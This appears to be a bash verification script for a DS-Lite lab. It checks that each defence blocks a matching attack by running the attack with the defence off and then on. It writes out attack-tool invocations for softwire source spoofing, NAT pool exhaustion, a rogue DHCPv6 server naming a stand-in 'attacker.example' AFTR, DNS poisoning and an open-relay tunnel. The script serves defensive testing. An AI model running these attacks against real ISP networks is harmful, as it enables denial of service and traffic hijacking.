#!/bin/bash
# verify_all.sh - honest, single-pass off/on verification of EVERY article/RFC
# defence against the ACTUAL attack, in a healthy lab. Replaces the old
# verify_defenses.sh. Run from the host:  bash testbed/defenses/verify_all.sh
#
# For each defence it: (1) runs the attack with the defence OFF and checks the
# attack SUCCEEDS (vulnerable baseline), (2) applies the defence ON and checks
# the attack is BLOCKED. Prints a PASS only if BOTH hold. Real measured numbers
# are shown so the result is auditable, not asserted.
set -u
C="${CONTAINER_NAME:-ds-lite-lab}"
HERE="$(cd "$(dirname "$0")" && pwd)"
AP="$HERE/article_defenses.sh"
T=/testbed/attack_tools
CP=2001:db8:cafe; AFTR=$CP::10; VB4=$CP::b41; B42=$CP::b42; ATK6=$CP::13a
GW1=10.0.1.1; SRV=198.51.100.2; SHARED=192.0.2.1
dx(){ docker exec "$C" "$@"; }
nse(){ docker exec "$C" ip netns exec "$@"; }
PASS=0; FAIL=0
ok(){ printf '  \033[32mPASS\033[0m  %-14s %s\n' "$1" "$2"; PASS=$((PASS+1)); }
no(){ printf '  \033[31mFAIL\033[0m  %-14s %s\n' "$1" "$2"; FAIL=$((FAIL+1)); }
hdr(){ printf '\n== %s ==\n' "$*"; }

prov_attacker(){ nse attacker ip link show eth-isp >/dev/null 2>&1 || dx sh -c '
  ip netns add attacker 2>/dev/null
  ip link add eth-isp-atk type veth peer name atk-br 2>/dev/null
  ip link set eth-isp-atk netns attacker 2>/dev/null
  ip netns exec attacker ip link set eth-isp-atk name eth-isp 2>/dev/null
  ip link set atk-br master br-isp 2>/dev/null; ip link set atk-br up 2>/dev/null
  ip netns exec attacker ip link set lo up 2>/dev/null
  ip netns exec attacker ip link set eth-isp up 2>/dev/null
  ip netns exec attacker ip -6 addr add '"$ATK6"'/64 dev eth-isp 2>/dev/null'; }
hub_bridge(){ dx ip link set br-isp type bridge ageing_time 0 2>/dev/null
  dx sh -c 'for p in b41-br b42-br aftr-br atk-br dns-br dhcp6s-br; do bridge link set dev $p flood on mcast_flood on 2>/dev/null; done'; }
restart_pcp(){ # $1 env
  nse aftr pkill -9 -f pcp_server.py 2>/dev/null
  nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.6
  dx ip netns exec aftr env PCP_POOL_SIZE="${2:-1024}" $1 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
  dx ip netns exec b4-1 env $1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.1.1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  dx ip netns exec b4-2 env $1 python3 /testbed/b4/pcp_proxy.py --lan-ip 10.0.2.1 --b4-ip6 $B42 --aftr-ip6 $AFTR --passthrough-third-party >/dev/null 2>&1 &
  sleep 2; }

prov_attacker; hub_bridge

# ── T1 TRABELSI (NAT state exhaustion) - via runner ─────────────────────────
hdr "T1  TRABELSI  (NAT/conntrack state exhaustion)"
bash "$AP" TRABELSI off >/dev/null 2>&1
# do_T1's two-phase RUN_LINE ends with the SIEGE victim code: "... client1=<code> ..."
o=$(dx bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+' | tail -1)
bash "$AP" TRABELSI on >/dev/null 2>&1
n=$(dx bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+' | tail -1)
bash "$AP" TRABELSI off >/dev/null 2>&1
{ echo "$o"|grep -q 000 && echo "$n"|grep -q 200; } && ok TRABELSI "OFF $o | ON $n" || no TRABELSI "OFF $o | ON $n"

# ── T3 ESP_AEAD (softwire interception) ─────────────────────────────────────
hdr "T3  ESP_AEAD  (unencrypted-tunnel interception)"
t4(){ dx ip netns exec b4-1 rm -f /tmp/v.pcap 2>/dev/null
  dx ip netns exec b4-1 timeout 8 tcpdump -i eth-isp -n "ip6 proto 4" -w /tmp/v.pcap >/dev/null 2>&1 &
  sleep 0.6; nse client1 sh -c "for i in 1 2 3 4 5; do curl -s -o /dev/null --max-time 3 http://$SRV/; done" >/dev/null 2>&1; sleep 8
  nse b4-1 tcpdump -nr /tmp/v.pcap -A 2>/dev/null | grep -caiE 'GET /|HTTP/1'; }
bash "$AP" ESP_AEAD off >/dev/null 2>&1; o=$(t4)
bash "$AP" ESP_AEAD on  >/dev/null 2>&1; n=$(t4)
bash "$AP" ESP_AEAD off >/dev/null 2>&1
{ [ "${o:-0}" -gt 0 ] && [ "${n:-0}" -eq 0 ]; } && ok ESP_AEAD "OFF $o cleartext markers | ON $n" || no ESP_AEAD "OFF $o | ON $n"

# ── T2/T4/T5 SAVI (forged softwire source) ──────────────────────────────────
# SAVI per-port source validation drops any carrier packet whose source the
# sending port does not own. All three spoofing attacks forge the victim B4
# source (T2 takeover, T4 downstream injection, T5 reassembly collision), so
# this one check covers the family. SAVI is the reliable T5 defence.
hdr "T2/T4/T5  SAVI  (forged softwire source)"
t3(){ dx ip netns exec aftr rm -f /tmp/t.pcap 2>/dev/null
  dx ip netns exec aftr timeout 8 tcpdump -i eth-isp -n "ip6 src $VB4 and ip6 dst $AFTR and ip6 proto 4" -w /tmp/t.pcap >/dev/null 2>&1 &
  sleep 0.5; nse attacker sh -c "timeout 6 python3 $T/tunnel/tunnel_spoof.py spoof --interface eth-isp --src-ip6 $ATK6 --victim-b4-ip6 $VB4 --aftr-ip6 $AFTR --inner-src-ip4 10.0.1.77 --inner-dst-ip4 $SRV --proto udp --focused --dst-port 9999 --count 8 --batch 1 --interval 0.2" >/dev/null 2>&1; sleep 8
  nse aftr tcpdump -nr /tmp/t.pcap 2>/dev/null | wc -l; }
bash "$AP" SAVI off >/dev/null 2>&1; o=$(t3)
bash "$AP" SAVI on  >/dev/null 2>&1; n=$(t3)
bash "$AP" SAVI off >/dev/null 2>&1
{ [ "${o:-0}" -gt 0 ] && [ "${n:-0}" -eq 0 ]; } && ok SAVI "OFF $o forged reach provider | ON $n (closes T2/T4/T5)" || no SAVI "OFF $o | ON $n"

# ── T12 SAVI (softwire identity multiplication / shared-pool drain) ──────────
# T12 forges MANY outer softwire identities from a DIFFERENT /64 (cafe:dead::/64)
# to drain the shared 64,512-port pool and deny co-residents. Proper SAVI binds
# each access port to the source it owns and drops every forged identity, so the
# pool never fills and the co-resident stays up. A carrier-/64-only rule MISSES
# this off-prefix forgery; the bind must cover all global unicast (2000::/3).
hdr "T12  SAVI  (softwire identity multiplication / shared-pool drain)"
nse aftr sh -c 'for f in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 0 > $f; done' 2>/dev/null
t12(){ nse aftr conntrack -F >/dev/null 2>&1
  nse attacker sh -c "timeout 20 python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --src-ip6-prefix ${CP}:dead::/64 --fixed-dport 80 --proto tcp --dst-ip4 $SRV --aftr-ip6 $AFTR --inner-src-prefix 10.90.0.0/16 --threads 8 --batch 256 >/dev/null 2>&1" &
  sleep 12
  local pool c2; pool=$(nse aftr conntrack -L 2>/dev/null | grep -c "dst=$SRV.*dport=80")
  c2=$(nse client2 curl -s -o /dev/null -w '%{http_code}' --max-time 4 http://$SRV/ 2>/dev/null)
  nse attacker pkill -9 -f nat_exhaustion 2>/dev/null; nse aftr conntrack -F >/dev/null 2>&1
  printf '%s %s' "$pool" "$c2"; }
bash "$AP" SAVI off >/dev/null 2>&1; read po co2 <<<"$(t12)"
bash "$AP" SAVI on  >/dev/null 2>&1; read pn cn2 <<<"$(t12)"
bash "$AP" SAVI off >/dev/null 2>&1
{ [ "${po:-0}" -gt 40000 ] && [ "${co2:-200}" = 000 ] && [ "${pn:-99999}" -lt 10000 ] && [ "${cn2:-000}" = 200 ]; } \
  && ok SAVI_T12 "OFF pool=$po co-res=$co2 | ON pool=$pn co-res=$cn2 (identity flood blocked)" \
  || no SAVI_T12 "OFF pool=$po co-res=$co2 | ON pool=$pn co-res=$cn2"

# ── T6/T7 PCP_OWNERSHIP (cross-subscriber PCP) ─────────────────────────────
hdr "T6/T7  PCP_OWNERSHIP  (THIRD_PARTY / PEER cross-subscriber)"
t8(){ nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
  nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py thirdparty --proxy-ip $GW1 --target-internal 10.0.2.100" >/dev/null 2>&1
  nse aftr nft list chain ip nat pcp_dnat 2>/dev/null | grep -c 10.0.2.100; }
restart_pcp "" ; o=$(t8)
restart_pcp "T10_THIRD_PARTY_OWNERSHIP_CHECK=1"; n=$(t8)
restart_pcp ""
{ [ "${o:-0}" -gt 0 ] && [ "${n:-0}" -eq 0 ]; } && ok PCP_OWNERSHIP "OFF $o cross-sub DNAT | ON $n" || no PCP_OWNERSHIP "OFF $o | ON $n"

# ── T10 SNMP_USM (management-plane) ─────────────────────────────────────────
hdr "T10  SNMP_USM  (MIB write + disclosure)"
# Target the WRITABLE, UNconstrained port-usage alarm threshold (RFC 7870 re-lay):
# dsliteAFTRAlarmPortNumber = .240.1.3.1.8 (Integer32, default -1). NOTE .1 is
# B4AddrType (read-only) and .6 ConnectNumber is range-clamped 60..90 -> a 2^31
# SET there is rejected regardless of USM, so neither is a valid USM probe.
OID=1.3.6.1.2.1.240.1.3.1.8
snmp_attack_set(){ nse mgmt sh -c "timeout 8 python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmPortNumber --value 2147483647" >/dev/null 2>&1; }
bash "$AP" SNMP_USM off >/dev/null 2>&1; sleep 0.5
nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $OID i 1000 >/dev/null 2>&1; snmp_attack_set
o=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $OID 2>/dev/null | grep -oE '[0-9-]+$')
bash "$AP" SNMP_USM on >/dev/null 2>&1; sleep 0.5; snmp_attack_set
n=$(nse aftr python3 /testbed/defenses/snmpv3_client.py --host 10.99.0.1 --oid $OID 2>/dev/null | grep -oE 'integer=[0-9-]+' | grep -oE '[0-9-]+$')
bash "$AP" SNMP_USM off >/dev/null 2>&1
# OFF: the v2c SET drove the threshold to Integer32 max. ON: USM rejects the v2c
# SET so the OAM read stays at the (legit) default, never the attacker's value.
{ [ "${o:-0}" -gt 1000000 ] && [ "${n:-2147483647}" -lt 1000000 ]; } && ok SNMP_USM "OFF v2c-SET=$o | ON OAM reads $n" || no SNMP_USM "OFF $o | ON $n"

# ── T9/T9 DHCPV6_AUTH (rogue AFTR) ────────────────────────────────────────
hdr "T9/T9  DHCPV6_AUTH  (rogue DHCPv6 AFTR-Name)"
dx test -f /testbed/defenses/keys/dhcpv6_ed25519.sec || dx python3 /testbed/defenses/dhcpv6auth.py keygen --out /testbed/defenses/keys >/dev/null 2>&1
dx pkill -9 -f 'dhcpd -6' 2>/dev/null
# the B4 dhclient holds the client port 546; the verifying client cannot bind
# until it is stopped (otherwise the SOLICIT/ADVERTISE never reaches our client).
nse b4-1 pkill -9 -f 'dhclient.*b4-1' 2>/dev/null; dx pkill -9 -f 'dhclient6-b4-1' 2>/dev/null
dx ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 >/dev/null 2>&1 &
sleep 1.5
o=$(nse b4-1 python3 /testbed/defenses/dhcpv6auth.py client --iface eth-isp --key /testbed/defenses/keys --insecure --wait 4 2>&1 | grep -oE 'AFTR=[^ ]+' | head -1)
dx ip netns exec dhcpv6server python3 /testbed/defenses/dhcpv6auth.py server --iface eth-isp --key /testbed/defenses/keys --aftr aftr.dslite.example.com. --dns $CP::2 >/dev/null 2>&1 &
sleep 0.5
n=$(nse b4-1 python3 /testbed/defenses/dhcpv6auth.py client --iface eth-isp --key /testbed/defenses/keys --wait 4 2>&1 | grep -oE 'AFTR=[^ ]+' | head -1)
dx pkill -9 -f 'dhcpv6_hijack.py' 2>/dev/null; dx pkill -9 -f 'dhcpv6auth.py server' 2>/dev/null
{ echo "$o"|grep -qi evil && echo "$n"|grep -qi 'aftr.dslite'; } && ok DHCPV6_AUTH "OFF $o | ON $n" || no DHCPV6_AUTH "OFF $o | ON $n"

# ── T8 DNS_COOKIES (off-path AFTR-FQDN poisoning) - via runner ─────────────
hdr "T8  DNS_COOKIES  (off-path DNS poisoning)"
nse b4-1 pkill -9 -f 'dns_0x20_forwarder|dns_cookies_forwarder' 2>/dev/null
nse dns-server pkill -9 -f dns_sink 2>/dev/null
nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
nse b4-1 sysctl -qw net.core.rmem_max=33554432 2>/dev/null
sleep 1
nse aftr conntrack -F >/dev/null 2>&1   # clear the sweep's cumulative NAT/conntrack state
nse b4-1 pkill -HUP dnsmasq 2>/dev/null   # flush the resolver cache so the OFF baseline can re-poison
bash "$AP" DNS_COOKIES off >/dev/null 2>&1
# The off-path poison is a race the paper measures over 20 runs (Section on
# reproducibility). Under the full sweep's cumulative load a single attempt can
# lose and return <none>, so retry the OFF baseline until the poison lands.
o=""
for _try in 1 2 3 4 5 6; do
  o=$(dx bash /testbed/scripts/run_attack_live.sh T8 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1)
  echo "$o" | grep -qiE '::13a|cafe:0:' && break
  nse b4-1 pkill -9 -f 'dns_0x20_forwarder|dns_cookies_forwarder' 2>/dev/null
  nse b4-1 pkill -HUP dnsmasq 2>/dev/null; sleep 1
done
bash "$AP" DNS_COOKIES on >/dev/null 2>&1
n=$(dx bash /testbed/scripts/run_attack_live.sh T8 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1)
bash "$AP" DNS_COOKIES off >/dev/null 2>&1
{ echo "$o"|grep -qiE '::13a|cafe:0:' && ! echo "$n"|grep -qiE '::13a|cafe:0:'; } && ok DNS_COOKIES "OFF $o | ON $n" || no DNS_COOKIES "OFF $o | ON $n"

# ── DECAP_BIND (softwire open-relay / RFC 6324 loop) ────────────────────────
hdr "D11  DECAP_BIND  (T11 softwire decap relay + RFC 6324 loop + cross-plane mgmt access)"
# An UNPROVISIONED carrier host builds a softwire to the AFTR (no DHCPv6/PCP) and
# relays IPv4 to the Internet, laundered as the shared public IPv4
# (CVE-2025-23018 / Beitis & Vanhoef USENIX'25 class). DECAP_BIND drops it by
# binding the inner IPv4 source to the softwire at decapsulation, while a
# legitimate subscriber (client1) is unaffected.
nse aftr sh -c 'for f in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 0 > $f; done' 2>/dev/null  # default build (uRPF off)
nse attacker ip link del atkrelay 2>/dev/null
nse attacker ip link add atkrelay type ip6tnl local $ATK6 remote $AFTR mode ip4ip6 encaplimit none 2>/dev/null
nse attacker ip link set atkrelay up 2>/dev/null
nse attacker ip addr add 10.66.66.66/32 dev atkrelay 2>/dev/null
nse attacker ip route add 198.51.100.0/24 dev atkrelay 2>/dev/null
_relay(){ # $1 = source ns, $2 = unique tag; echoes count of ICMP relayed to the server as the shared IPv4
  nse server pkill -9 tcpdump 2>/dev/null; sleep 0.4; nse aftr conntrack -F >/dev/null 2>&1
  docker exec -d "$C" ip netns exec server sh -c "timeout 5 tcpdump -Uni eth0 'icmp and src $SHARED' -w /tmp/dbr_$2.pcap 2>/dev/null"
  sleep 1.2; nse "$1" ping -c 3 -i 0.3 -W1 $SRV >/dev/null 2>&1; sleep 2
  nse server tcpdump -nr /tmp/dbr_$2.pcap 2>/dev/null | grep -c 'echo request'; }
bash "$AP" DECAP_BIND off >/dev/null 2>&1; o=$(_relay attacker off)
bash "$AP" DECAP_BIND on  >/dev/null 2>&1; n=$(_relay attacker on); lg=$(_relay client1 lg)
bash "$AP" DECAP_BIND off >/dev/null 2>&1
nse attacker ip link del atkrelay 2>/dev/null
{ [ "${o:-0}" -gt 0 ] && [ "${n:-1}" -eq 0 ] && [ "${lg:-0}" -gt 0 ]; } \
  && ok DECAP_BIND "OFF relay=$o to Internet | ON relay=$n blocked, legit=$lg ok" \
  || no DECAP_BIND "OFF $o | ON relay=$n legit=$lg"

# confused-deputy: a mere subscriber (P1) rides the softwire into the AFTR's LOCAL
# management agent (10.99.0.1 SNMP), collapsing the P3 plane to P1. The inner-DEST
# infrastructure filter drops it while legitimate P3 (mgmt station) access is kept.
_cdep(){ nse "$1" sh -c "snmpget -v2c -c public -t2 -r1 10.99.0.1 1.3.6.1.2.1.240.1.3.1.8 2>/dev/null | grep -c INTEGER"; }
bash "$AP" DECAP_BIND off >/dev/null 2>&1; cdo=$(_cdep client1)
bash "$AP" DECAP_BIND on  >/dev/null 2>&1; cdn=$(_cdep client1); cdp=$(_cdep mgmt)
bash "$AP" DECAP_BIND off >/dev/null 2>&1
{ [ "${cdo:-0}" -gt 0 ] && [ "${cdn:-1}" -eq 0 ] && [ "${cdp:-0}" -gt 0 ]; } \
  && ok DECAP_BIND_XPLANE "OFF P1->AFTR MIB via softwire | ON P1 blocked, P3 mgmt ok" \
  || no DECAP_BIND_XPLANE "OFF P1=$cdo | ON P1=$cdn P3=$cdp"

# ── summary ─────────────────────────────────────────────────────────────────
printf '\n================ %d PASS, %d FAIL ================\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
